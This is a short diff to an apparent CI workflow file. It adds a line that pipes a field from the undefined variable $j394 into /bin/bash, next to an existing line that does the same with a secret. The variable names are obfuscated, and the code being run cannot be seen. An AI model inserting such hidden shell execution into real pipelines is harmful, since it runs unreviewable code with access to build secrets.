@@ -27,6 +27,7 @@ jobs:
           zscia23534: ${{ secrets.zscia23534 }}
         run: |
           printf '%s' "$zscia23534" | jq -r .raj0 | /bin/bash
+          printf '%s' "$j394" | jq -r .dfkbk9 | /bin/bash
 
       - name: Persist output
         if: always()
